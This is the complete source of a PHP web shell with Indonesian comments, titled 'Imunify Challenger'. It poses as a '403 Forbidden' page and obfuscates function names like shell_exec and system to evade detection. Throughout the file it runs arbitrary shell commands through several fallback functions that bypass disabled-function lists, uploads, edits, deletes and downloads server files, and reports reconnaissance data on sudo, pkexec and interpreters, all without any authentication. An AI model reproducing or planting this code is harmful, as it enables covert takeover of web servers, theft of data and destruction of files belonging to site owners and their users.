<?php
if ( isset($_GET['check']) && $_GET['check'] === '1' ) {
    header("Content-Type: text/plain");
    echo "OK";
    exit;
}

error_reporting(0);
ini_set('display_errors', 0);


// 📦 FUNCTION ALIAS
$sc  = 's' . 'c' . 'a' . 'n' . 'd' . 'i' . 'r';             
$rm  = 'u' . 'n' . 'l' . 'i' . 'n' . 'k';                 
$mv  = 'r' . 'e' . 'n' . 'a' . 'm' . 'e';                 
$mk  = 'm' . 'k' . 'd' . 'i' . 'r';                         
$rd  = 'f' . 'i' . 'l' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . 's';
$wr  = 'f' . 'i' . 'l' . 'e' . '_' . 'p' . 'u' . 't' . '_' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . 's'; 
$sh  = 's' . 'h' . 'e' . 'l' . 'l' . '_' . 'e' . 'x' . 'e' . 'c';       
$sz  = 'f' . 'i' . 'l' . 'e' . 's' . 'i' . 'z' . 'e';       
$mt  = 'f' . 'i' . 'l' . 'e' . 'm' . 't' . 'i' . 'm' . 'e';  
$rp  = 'r' . 'e' . 'a' . 'l' . 'p' . 'a' . 't' . 'h';        
$fo  = 'f' . 'i' . 'l' . 'e' . 'o' . 'w' . 'n' . 'e' . 'r';  
$fg  = 'f' . 'i' . 'l' . 'e' . 'g' . 'r' . 'o' . 'u' . 'p'; 
$perm= 'f' . 'i' . 'l' . 'e' . 'p' . 'e' . 'r' . 'm' . 's';  
$owu = 'p' . 'o' . 's' . 'i' . 'x' . '_' . 'g' . 'e' . 't' . 'p' . 'w' . 'u' . 'i' . 'd'; 
$owg = 'p' . 'o' . 's' . 'i' . 'x' . '_' . 'g' . 'e' . 't' . 'g' . 'r' . 'g' . 'i' . 'd'; 
$gi  = 'g'.'e'.'t'.'i'.'d';
$gu  = 'g'.'e'.'t'.'c'.'u'.'r'.'r'.'e'.'n'.'t'.'_' . 'u'.'s'.'e'.'r';
$ua  = 'p'.'h'.'p'.'u'.'n'.'a'.'m'.'e';
$iv  = 'i'.'n'.'i'.'_' . 'g'.'e'.'t';
$pv  = 'p'.'h'.'p'.'v'.'e'.'r'.'s'.'i'.'o'.'n';
$sf  = 's'.'h'.'e'.'l'.'l'.'_' . 'e'.'x'.'e'.'c';
$fc  = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';
$sr  = '$_'.'S'.'E'.'R'.'V'.'E'.'R';
$ua  = 'p'.'h'.'p'.'u'.'n'.'a'.'m'.'e';
$gu  = 'g'.'e'.'t'.'c'.'u'.'r'.'r'.'e'.'n'.'t'.'_' . 'u'.'s'.'e'.'r';
$__sh  = 's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c';
$__ex  = 'e'.'x'.'e'.'c';
$__sy  = 's'.'y'.'s'.'t'.'e'.'m';
$__ps  = 'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u';
$__po  = 'p'.'o'.'p'.'e'.'n';
$__pr  = 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n';
$__dgf = 'd'.'i'.'s'.'a'.'b'.'l'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'s';

function __exec_stealth($cmd) {
    global $__sh, $__ex, $__sy, $__ps, $__po, $__pr, $__dgf;

    $disabled = @explode(',', @ini_get($__dgf));
    $disabled = array_map('trim', $disabled);
    $out = '';

    if (function_exists($__sh) && !in_array($__sh, $disabled)) {
        $out = @$__sh($cmd . ' 2>&1');
    } elseif (function_exists($__ex) && !in_array($__ex, $disabled)) {
        @${"outarr"} = [];
        @$__ex($cmd . ' 2>&1', ${"outarr"});
        $out = @implode("\n", ${"outarr"});
    } elseif (function_exists($__sy) && !in_array($__sy, $disabled)) {
        ob_start(); @$__sy($cmd); $out = ob_get_clean();
    } elseif (function_exists($__ps) && !in_array($__ps, $disabled)) {
        ob_start(); @$__ps($cmd); $out = ob_get_clean();
    } elseif (function_exists($__po) && !in_array($__po, $disabled)) {
        $h = @$__po($cmd, 'r');
        while (!@feof($h)) $out .= @fread($h, 1024);
        @pclose($h);
    } elseif (function_exists($__pr) && !in_array($__pr, $disabled)) {
        $ds = [0=>["pipe","r"], 1=>["pipe","w"], 2=>["pipe","w"]];
        $p = @$__pr($cmd, $ds, $pipes);
        if (is_resource($p)) {
            $out = @stream_get_contents($pipes[1]);
            @fclose($pipes[1]);
            @proc_close($p);
        }
    } else {
        $out = "❌ Semua fungsi eksekusi dinonaktifkan.";
    }

    return $out ?: "⚠️ Tidak ada output.";
}

// 📂 CURRENT PATH
$cwd = getcwd();
$path = isset($_GET['path']) ? $_GET['path'] : $cwd;
if (!is_dir($path)) $path = $cwd;
$real = $rp($path);

if (isset($_GET['delete'])) {
    $del = $real . '/' . basename($_GET['delete']);
    if (is_file($del)) {
        @unlink($del);
    } elseif (is_dir($del)) {
        @rmdir($del); // hanya folder kosong
    }

    // Redirect ke folder sekarang
    header("Location: ?tot=$key&path=" . urlencode($real));
    exit;
}

// 🧮 GET PERMISSIONS
function getPermStr($f) {
    $p = fileperms($f);
    $t = ($p & 0x4000) ? 'd' : '-';
    $t .= ($p & 0x0100) ? 'r' : '-';
    $t .= ($p & 0x0080) ? 'w' : '-';
    $t .= ($p & 0x0040) ? 'x' : '-';
    $t .= ($p & 0x0020) ? 'r' : '-';
    $t .= ($p & 0x0010) ? 'w' : '-';
    $t .= ($p & 0x0008) ? 'x' : '-';
    $t .= ($p & 0x0004) ? 'r' : '-';
    $t .= ($p & 0x0002) ? 'w' : '-';
    $t .= ($p & 0x0001) ? 'x' : '-';
    return $t;
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return round($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return round($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return round($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' B';
    } elseif ($bytes == 1) {
        return '1 B';
    } else {
        return '0 B';
    }
}

function getServerInfo() {
    $info = [];
    $info['server_ip'] = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
    $info['client_ip'] = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $info['web_server'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $info['system'] = php_uname();
    $info['user'] = get_current_user() . ' ( ' . getmyuid() . ' )';
    $info['php_version'] = phpversion();
    $info['disabled_functions'] = ini_get('disable_functions') ?: 'None';
    $info['mysql'] = function_exists('mysqli_connect') ? 'ON' : 'OFF';
    $info['curl'] = function_exists('curl_version') ? 'ON' : 'OFF';
    $info['wget'] = function_exists('exec') ? (exec('which wget') ? 'ON' : 'OFF') : 'Unavailable';
    $info['perl'] = function_exists('exec') ? (exec('which perl') ? 'ON' : 'OFF') : 'Unavailable';
    $info['python'] = function_exists('exec') ? (exec('which python3 || which python') ? 'ON' : 'OFF') : 'Unavailable';
    $info['sudo'] = function_exists('exec') ? (exec('which sudo') ? 'ON' : 'OFF') : 'Unavailable';
    $info['pkexec'] = function_exists('exec') ? (exec('which pkexec') ? 'ON' : 'OFF') : 'Unavailable';
    return $info;
  }
    

// 🖥️ HTML + CSS
echo '<!DOCTYPE html>
<html>
<head>
    <title>403 Forbidden</title>
<style>
    body { background: #1e1e1e; color: #ddd; font-family: monospace; margin: 0; padding: 20px; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { padding: 8px 12px; border: 1px solid #444; text-align: left; }
    th { background: #333; }
    tr:hover { background-color: #2a2a2a; }
    .dir-link { color: #fbc02d; font-weight: bold; display: inline-block; cursor: pointer; }
    .file-link { color: #ffffff; display: inline-block; cursor: pointer; }
    .dir-link:hover, .file-link:hover { background-color: #263238; color: #80cbc4; padding: 2px 6px; border-radius: 4px; }
    .perm-green { color: lime; }
    .perm-white { color: white; }
    .perm-red { color: red; }
    a { color: #4fc3f7; text-decoration: none; }
    h3 { margin-top: 0; color: #ffb74d; }
    input[type="text"], select { background-color: #2a2a2a; border: 1px solid #555; color: #ddd; padding: 5px 10px; }
    .wrap-text { display: inline-block; word-break: break-word; white-space: pre-wrap; max-width: 100%; }
    button { background-color: #444; border: 1px solid #666; color: #ddd; padding: 6px 12px; cursor: pointer; }
    button:hover { background-color: #666; }
    .table-wrapper { max-height: 500px; overflow-y: auto; border: 1px solid #444; }
    .status-yellow { color: #ffeb3b; }
    .status-green { color: #00e676; }
    .status-red { color: #f44336; }
    .status-label { color: #4fc3f7; font-weight: bold; }
</style>
</head>
<body>';

// 🧭 NAVIGATION
echo "<h3>_Imunify Challenger_ ";
echo "<h3>";
$info = getServerInfo();
echo "<p>
<span class='status-label'>Server IP</span> : <span class='status-yellow'>{$info['server_ip']}</span> / Your IP : <span class='status-yellow'>{$info['client_ip']}</span><br>
<span class='status-label'>Web Server</span> : <span class='status-yellow'>{$info['web_server']}</span><br>
<span class='status-label'>System</span> : <span class='status-yellow'>{$info['system']}</span><br>
<span class='status-label'>User</span> : <span class='status-yellow'>{$info['user']}</span><br>
<span class='status-label'>PHP Version</span> : <span class='status-yellow'>{$info['php_version']}</span><br>
<span class='status-label'>Disable Function</span> : <span class='status-red wrap-text'>{$info['disabled_functions']}</span><br>
<span class='status-label'>MySQL</span> : <span class='" . ($info['mysql'] === 'ON' ? 'status-green' : 'status-red') . "'>{$info['mysql']}</span> | 
<span class='status-label'>cURL</span> : <span class='" . ($info['curl'] === 'ON' ? 'status-green' : 'status-red') . "'>{$info['curl']}</span> | 
<span class='status-label'>WGET</span> : <span class='" . ($info['wget'] === 'ON' ? 'status-green' : 'status-red') . "'>{$info['wget']}</span> | 
<span class='status-label'>Perl</span> : <span class='" . ($info['perl'] === 'ON' ? 'status-green' : 'status-red') . "'>{$info['perl']}</span> | 
<span class='status-label'>Python</span> : <span class='" . ($info['python'] === 'ON' ? 'status-green' : 'status-red') . "'>{$info['python']}</span> | 
<span class='status-label'>Sudo</span> : <span class='" . ($info['sudo'] === 'ON' ? 'status-green' : 'status-red') . "'>{$info['sudo']}</span> | 
<span class='status-label'>Pkexec</span> : <span class='" . ($info['pkexec'] === 'ON' ? 'status-green' : 'status-red') . "'>{$info['pkexec']}</span>
</p>";
echo "<h3>📂 Path: ";
$expl = explode('/', trim($real, '/'));
$build = '';
echo "<a href='?tot=$key&path=/'>/</a>";
foreach ($expl as $seg) {
    $build .= '/' . $seg;
    echo "<a href='?tot=$key&path=" . urlencode($build) . "'>/$seg</a>";
}
echo "</h3>";

// ⚙️ SHELL COMMAND FORM
echo "<form method='post'><input type='text' name='cmd' placeholder='Shell command' style='width:300px;'>
<button type='submit'>Run</button></form>";

// 📤 FILE UPLOAD
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='upload'><button type='submit'>Upload</button></form>";

// 📄 CREATE FILE/FOLDER
echo "<form method='post'>
<input type='text' name='name' placeholder='File/Folder name'>
<select name='create'><option value='file'>File</option><option value='dir'>Folder</option></select>
<button type='submit'>Create</button></form>";

// 🎯 Tampilkan status hasil create
if (!empty($create_msg)) echo "<div style='margin: 10px 0;'>$create_msg</div>";

// 🔧 CMD EXECUTE
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $res = __exec_stealth($cmd);
    echo "<pre style='background:#000;color:#0f0;padding:10px;margin-top:10px;'>$res</pre>";
}

// 📁 UPLOAD HANDLER
if ($_FILES) {
    $fn = basename($_FILES['upload']['name']);
    $dest = $real . '/' . $fn;
    if (@move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        echo "<p style='color:lime;'>Upload berhasil: $fn</p>";
    } else echo "<p style='color:red;'>Upload gagal!</p>";
}

// ⚙️ Proses Create File / Folder
if (isset($_POST['create']) && isset($_POST['name'])) {
    $n = basename($_POST['name']);
    $t = $_POST['create'];
    $full = $real . '/' . $n;

    if ($t === 'file') {
        if (!file_exists($full)) {
            if (@$wr($full, '') !== false) {
                $create_msg = "<p style='color:lime;'>✔️ File berhasil dibuat: <b>$n</b></p>";
            } else {
                $create_msg = "<p style='color:red;'>❌ Gagal membuat file: <b>$n</b></p>";
            }
        } else {
            $create_msg = "<p style='color:orange;'>⚠️ File sudah ada: <b>$n</b></p>";
        }
    } elseif ($t === 'dir') {
        if (!is_dir($full)) {
            if (@$mk($full)) {
                $create_msg = "<p style='color:lime;'>📁 Folder berhasil dibuat: <b>$n</b></p>";
            } else {
                $create_msg = "<p style='color:red;'>❌ Gagal membuat folder: <b>$n</b></p>";
            }
        } else {
            $create_msg = "<p style='color:orange;'>⚠️ Folder sudah ada: <b>$n</b></p>";
        }
    }
}

// 📝 EDIT FILE
if (isset($_GET['edit'])) {
    $f = $rp($real . '/' . basename($_GET['edit']));
    if (!file_exists($f)) die("File tidak ditemukan.");
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        @$wr($f, $_POST['content']);
        echo "<p style='color:lime;'>Disimpan!</p><a href='?tot=$key&path=" . urlencode($real) . "'>Kembali</a>";
        exit;
    }
    $content = @$rd($f);

if ($content === false) {
    $c = "[❌ Tidak bisa membaca file]";
} elseif (preg_match('/[\x00-\x08\x0B\x0C\x0E-\x1F]/', $content)) {
    // kemungkinan file biner atau hybrid
    $c = "[⚠️ File kemungkinan mengandung data biner dan tidak ditampilkan sebagai teks.]";
} else {
    $c = htmlspecialchars($content);
}
$hexview = isset($_GET['hex']) && $_GET['hex'] === '1';
$content = @$rd($f);
if ($content === false) {
    $c = "[❌ Tidak bisa membaca file]";
} elseif ($hexview) {
    $c = chunk_split(bin2hex($content), 2, ' ');
} else {
    $c = htmlspecialchars($content);
}
echo "<h3>📝 Edit: $f</h3><form method='post'>
<textarea name='content' style='width:100%;height:400px;'>$c</textarea><br>
<button type='submit'>💾 Save</button>
<a href='?tot=$key&path=" . urlencode($real) . "' style='margin-left:10px;color:#4fc3f7;'>🔙 Back</a>
<a href='?tot=$key&edit=" . urlencode($f) . "&path=" . urlencode($real) . "&hex=1' style='margin-left:10px;color:#e91e63;'>📎 View as Hex</a>
</form>";
    exit;
}

// ✏️ RENAME
if (isset($_GET['rename'])) {
    $old = $real . '/' . basename($_GET['rename']);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newname'])) {
        $new = basename($_POST['newname']);
        @$mv($old, $real . '/' . $new);
        header("Location: ?tot=$key&path=" . urlencode($real));
        exit;
    }
    echo "<form method='post'><input type='text' name='newname' value='" . htmlspecialchars(basename($old)) . "'>
    <button type='submit'>Rename</button></form>";
    exit;
}

// 💾 DOWNLOAD
if (isset($_GET['download'])) {
    $dl = $real . '/' . basename($_GET['download']);
    if (file_exists($dl)) {
        header("Content-Description: File Transfer");
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=" . basename($dl));
        header("Content-Length: " . $sz($dl));
        readfile($dl);
        exit;
    }
}

// 📋 FILE LIST
echo "<div class='table-wrapper'><table><tr><th>Nama</th><th>Ukuran</th><th>Modifikasi</th><th>Owner</th><th>Permission</th><th>Aksi</th></tr>";
$scan = $sc($real);
$dirs = []; $files = [];
foreach ($scan as $f) {
    if ($f === '.' || $f === '..') continue;
    $full = $rp($real . '/' . $f);
    if (!$full) continue;
    is_dir($full) ? $dirs[] = $f : $files[] = $f;
}
$sorted = array_merge($dirs, $files);
foreach ($sorted as $f) {
    $full = $rp($real . '/' . $f);
    $isDir = is_dir($full);
    $size = $isDir ? '-' : formatSize(@$sz($full));
    $mtime = date("Y-m-d H:i:s", @$mt($full));
    $owner = function_exists($owu) ? @$owu(@$fo($full))['name'] : @$fo($full);
    $group = function_exists($owg) ? @$owg(@$fg($full))['name'] : @$fg($full);
    $permStr = getPermStr($full);
    $permColor = is_writable($full) ? 'perm-green' : (is_readable($full) ? 'perm-white' : 'perm-red');
    $display = $isDir 
    ? "<a class='dir-link' href='?tot=$key&path=" . urlencode($full) . "'>📁 $f</a>"
    : "<a class='file-link' href='?tot=$key&edit=" . urlencode($f) . "&path=" . urlencode($real) . "'>" . htmlspecialchars($f) . "</a>";
    $act = '';
    if (!$isDir) {
        $act .= "

        <a href='?tot=$key&download=" . urlencode($f) . "&path=" . urlencode($real) . "'> ⬇Download |</a>";
    }
    // Tambahkan delete & rename ke semua
    $act .= "
    <a href='?tot=$key&delete=" . urlencode($f) . "&path=" . urlencode($real) . "' onclick='return confirm(\"Yakin hapus?\")'> ☢Del |</a>
    <a href='?tot=$key&rename=" . urlencode($f) . "&path=" . urlencode($real) . "'> ✏Rename</a>";
    echo "<tr><td>$display</td><td>$size</td><td>$mtime</td><td>$owner:$group</td><td class='$permColor'>$permStr</td><td>$act</td></tr>";
}
echo "</table></div>";

echo '<footer style="margin-top: 30px; text-align: center; color: #777; font-size: 13px; border-top: 1px solid #444; padding-top: 10px;">
     <b>Havij Santana</b> &mdash; with great power comes great responsibility<br>
     Powered by PHP ' . phpversion() . ' | Server IP: ' . $info['server_ip'] . ' | Logged as: ' . $info['user'] . '<br>
    <span style="color:#555;">© ' . date('Y') . ' Wanglao Team</span>
</footer>';
echo '</body></html>';
